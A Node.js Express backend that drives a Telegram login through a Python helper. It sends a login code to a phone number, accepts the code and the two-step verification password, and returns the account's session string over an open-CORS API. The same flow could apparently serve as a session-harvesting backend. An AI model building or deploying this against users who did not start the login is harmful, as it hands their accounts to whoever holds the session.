require('dotenv').config();
const express = require('express');
const cors = require('cors');
const { spawn } = require('child_process');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());

// In-memory store for phone_code_hash
const sessionStore = new Map();

function callPython(command, data) {
    return new Promise((resolve, reject) => {
        const py = spawn('python3', [
            path.join(__dirname, 'telegram_helper.py'),
            command,
            JSON.stringify(data)
        ]);

        let output = '';
        py.stdout.on('data', (data) => {
            output += data.toString();
        });

        py.stderr.on('data', (data) => {
            console.error(`Python Error: ${data}`);
        });

        py.on('close', (code) => {
            try {
                resolve(JSON.parse(output));
            } catch (e) {
                reject(new Error(`Failed to parse Python output: ${output}`));
            }
        });
    });
}

app.post('/api/send-otp', async (req, res) => {
    const { phone } = req.body;
    if (!phone) return res.status(400).json({ error: 'Phone is required' });

    try {
        const result = await callPython('send_code', { phone });
        if (result.status === 'success') {
            sessionStore.set(phone, { phone_code_hash: result.phone_code_hash });
            res.json({ message: 'OTP sent via Telegram' });
        } else {
            res.status(400).json({ error: result.message });
        }
    } catch (err) {
        res.status(500).json({ error: 'Internal server error' });
    }
});

app.post('/api/verify-otp', async (req, res) => {
    const { phone, code, password } = req.body;
    const session = sessionStore.get(phone);

    if (!session) return res.status(400).json({ error: 'Session not found' });

    try {
        const result = await callPython('verify_code', {
            phone,
            code,
            phone_code_hash: session.phone_code_hash,
            password
        });

        if (result.status === 'success') {
            sessionStore.delete(phone);
            res.json({ message: 'Success', session: result.session });
        } else if (result.status === 'password_required') {
            res.json({ status: 'password_required', message: 'Two-step verification password required' });
        } else {
            res.status(400).json({ error: result.message });
        }
    } catch (err) {
        res.status(500).json({ error: 'Internal server error' });
    }
});

app.get('/', (req, res) => res.send('Telegram Session Backend Running'));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
